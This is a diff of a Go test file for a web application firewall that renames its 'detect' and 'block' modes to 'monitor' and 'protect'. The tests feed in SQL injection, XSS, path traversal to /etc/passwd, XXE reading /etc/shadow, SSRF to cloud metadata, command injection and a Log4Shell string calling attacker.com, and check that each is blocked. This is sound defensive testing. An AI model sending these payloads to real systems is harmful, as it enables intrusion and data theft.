@@ -50,15 +50,15 @@ func TestInspect_ModeOff_NoInspection(t *testing.T) {
 	}
 }
 
-func TestInspect_ModeDetect_NeverBlocks(t *testing.T) {
+func TestInspect_ModeMonitor_NeverBlocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodGet, "/?q=UNION+SELECT+1,2,3", "", nil)
-	result := e.Inspect(req, siteWith("detect"))
+	result := e.Inspect(req, siteWith("monitor"))
 	if result.Blocked {
-		t.Error("mode=detect must never set Blocked=true")
+		t.Error("mode=monitor must never set Blocked=true")
 	}
 	if result.Score == 0 {
-		t.Error("mode=detect should still accumulate score")
+		t.Error("mode=monitor should still accumulate score")
 	}
 }
 
@@ -69,7 +69,7 @@ func TestInspect_SQLi_UnionSelect_QueryBlocks(t *testing.T) {
 	// Use %20 for spaces: httptest.NewRequest parses the target as an HTTP/1.x
 	// request line where raw spaces terminate the URL token.
 	req := requestWith(http.MethodGet, "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("UNION SELECT in query should be blocked, score=%d matches=%d",
 			result.Score, len(result.MatchedRules))
@@ -82,7 +82,7 @@ func TestInspect_SQLi_UnionSelect_QueryBlocks(t *testing.T) {
 func TestInspect_SQLi_SleepBlocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodGet, "/?id=1%20AND%20SLEEP(5)", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("SLEEP() SQLi should be blocked, score=%d", result.Score)
 	}
@@ -91,7 +91,7 @@ func TestInspect_SQLi_SleepBlocks(t *testing.T) {
 func TestInspect_SQLi_InBody_Detected(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodPost, "/search", `{"q":"1 UNION SELECT 1,2,3"}`, nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("UNION SELECT in POST body should be blocked, score=%d", result.Score)
 	}
@@ -102,7 +102,7 @@ func TestInspect_SQLi_InBody_Detected(t *testing.T) {
 func TestInspect_XSS_ScriptTag_Blocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodGet, "/?comment=<script>alert(1)</script>", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("<script> tag should be blocked, score=%d", result.Score)
 	}
@@ -111,7 +111,7 @@ func TestInspect_XSS_ScriptTag_Blocks(t *testing.T) {
 func TestInspect_XSS_JSProtocol_Blocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodGet, "/?url=javascript:alert(1)", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("javascript: protocol should be blocked, score=%d", result.Score)
 	}
@@ -124,7 +124,7 @@ func TestInspect_Traversal_DotDotSlash_Blocks(t *testing.T) {
 	// Put traversal in query string to avoid Go's URL path normalization
 	// collapsing ../../ before the WAF gets to inspect it.
 	req := requestWith(http.MethodGet, "/?file=../../etc/passwd", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("../../ traversal in query should be blocked, score=%d", result.Score)
 	}
@@ -135,7 +135,7 @@ func TestInspect_Traversal_EncodedDotDot_Blocks(t *testing.T) {
 	// Percent-encoded traversal in query string; RawQuery preserves encoding
 	// so the WAF pattern (..%2f) can match.
 	req := requestWith(http.MethodGet, "/?file=..%2f..%2fetc%2fpasswd", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("URL-encoded traversal in query should be blocked, score=%d", result.Score)
 	}
@@ -146,7 +146,7 @@ func TestInspect_Traversal_EncodedDotDot_Blocks(t *testing.T) {
 func TestInspect_RCE_ShellExec_Blocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodGet, "/?cmd=shell_exec('id')", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("shell_exec() should be blocked, score=%d", result.Score)
 	}
@@ -156,7 +156,7 @@ func TestInspect_RCE_CmdSubstitution_Blocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	// Use a simple payload without spaces to avoid URL parsing issues.
 	req := requestWith(http.MethodGet, "/?x=$(id)", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("$() substitution in query should be blocked, score=%d", result.Score)
 	}
@@ -169,7 +169,7 @@ func TestInspect_Scanner_SQLmap_Detected(t *testing.T) {
 	req := requestWith(http.MethodGet, "/", "", map[string]string{
 		"User-Agent": "sqlmap/1.7 (https://sqlmap.org)",
 	})
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if result.Score == 0 {
 		t.Error("sqlmap User-Agent should be detected")
 	}
@@ -200,7 +200,7 @@ func TestInspect_AllowRule_OverridesBlock(t *testing.T) {
 
 	req := requestWith(http.MethodGet, "/?id=UNION%20SELECT%201,2,3", "", nil)
 	req.RemoteAddr = "192.168.1.1:54321"
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if result.Blocked || result.Score != 0 {
 		t.Errorf("allow rule should have stopped inspection: blocked=%v score=%d", result.Blocked, result.Score)
 	}
@@ -218,7 +218,7 @@ func TestInspect_DetectRules_AccumulateToThreshold(t *testing.T) {
 		`{"filter":"INFORMATION_SCHEMA.COLUMNS"}`,
 		nil,
 	)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Logf("score=%d matches=%d", result.Score, len(result.MatchedRules))
 		t.Error("detect rules should accumulate score past threshold and block")
@@ -231,7 +231,7 @@ func TestInspect_BodyIsRestoredAfterInspection(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	const payload = "normal body content without any attacks"
 	req := requestWith(http.MethodPost, "/api/data", payload, nil)
-	_ = e.Inspect(req, siteWith("detect"))
+	_ = e.Inspect(req, siteWith("monitor"))
 
 	// Body should still be readable after inspection.
 	if req.Body == nil {
@@ -265,7 +265,7 @@ func TestInspect_XXE_DocTypeEntityInBody_Blocks(t *testing.T) {
 	req := requestWith(http.MethodPost, "/upload", xmlPayload, map[string]string{
 		"Content-Type": "application/xml",
 	})
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("XXE DOCTYPE+ENTITY payload should be blocked, score=%d matches=%d",
 			result.Score, len(result.MatchedRules))
@@ -279,7 +279,7 @@ func TestInspect_XXE_EntitySystemInBody_Blocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	payload := `<!ENTITY myent SYSTEM "file:///etc/shadow">`
 	req := requestWith(http.MethodPost, "/parse", payload, nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("ENTITY SYSTEM payload should be blocked, score=%d", result.Score)
 	}
@@ -290,7 +290,7 @@ func TestInspect_XXE_EntitySystemInBody_Blocks(t *testing.T) {
 func TestInspect_SSRF_Localhost_Blocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodGet, "/?url=http://localhost/admin", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("SSRF localhost in query should be blocked, score=%d", result.Score)
 	}
@@ -302,7 +302,7 @@ func TestInspect_SSRF_Localhost_Blocks(t *testing.T) {
 func TestInspect_SSRF_AWSMetadata_Blocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodGet, "/?resource=http://169.254.169.254/latest/meta-data/", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("AWS IMDS URL should be blocked, score=%d", result.Score)
 	}
@@ -311,7 +311,7 @@ func TestInspect_SSRF_AWSMetadata_Blocks(t *testing.T) {
 func TestInspect_SSRF_GopherScheme_Blocks(t *testing.T) {
 	e := newTestEngine(DefaultThreshold)
 	req := requestWith(http.MethodPost, "/fetch", `{"url":"gopher://internal:6379/_SET key 1"}`, nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("gopher:// SSRF in body should be blocked, score=%d", result.Score)
 	}
@@ -325,11 +325,11 @@ func TestInspect_RCE_Log4Shell_Blocks(t *testing.T) {
 		"X-Api-Version": "${jndi:ldap://attacker.com/exploit}",
 	})
 	// Log4Shell in a header value
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 	// Header fields aren't extracted by the WAF; but the URI/query match may vary.
 	// The payload in URI query string is what we test canonically:
 	req2 := requestWith(http.MethodGet, "/?v=${jndi:ldap://attacker.com/exploit}", "", nil)
-	result = e.Inspect(req2, siteWith("block"))
+	result = e.Inspect(req2, siteWith("protect"))
 	if !result.Blocked {
 		t.Errorf("Log4Shell ${jndi:...} in query should be blocked, score=%d", result.Score)
 	}
@@ -374,7 +374,7 @@ func TestParanoia_Level1_ExcludesLevel3Rules(t *testing.T) {
 
 	// SQLI-HEX-ENCODE (level 3) — 0x41414141 should NOT be flagged at PL1.
 	req := requestWith(http.MethodGet, "/?data=0x41414141424343", "", nil)
-	result := e.Inspect(req, siteWith("block"))
+	result := e.Inspect(req, siteWith("protect"))
 
 	for _, m := range result.MatchedRules {
 		if m.Rule.Name == "SQLI-HEX-ENCODE_query" {
@@ -392,7 +392,7 @@ func TestParanoia_Level4_IncludesAllRules(t *testing.T) {
 
 	// At paranoia level 4 the hex pattern (level 3) should fire.
 	req := requestWith(http.MethodGet, "/?data=0x41414141424343434545", "", nil)
-	result := e.Inspect(req, siteWith("detect"))
+	result := e.Inspect(req, siteWith("monitor"))
 	found := false
 	for _, m := range result.MatchedRules {
 		if m.Rule.Name == "SQLI-HEX-ENCODE_query" {
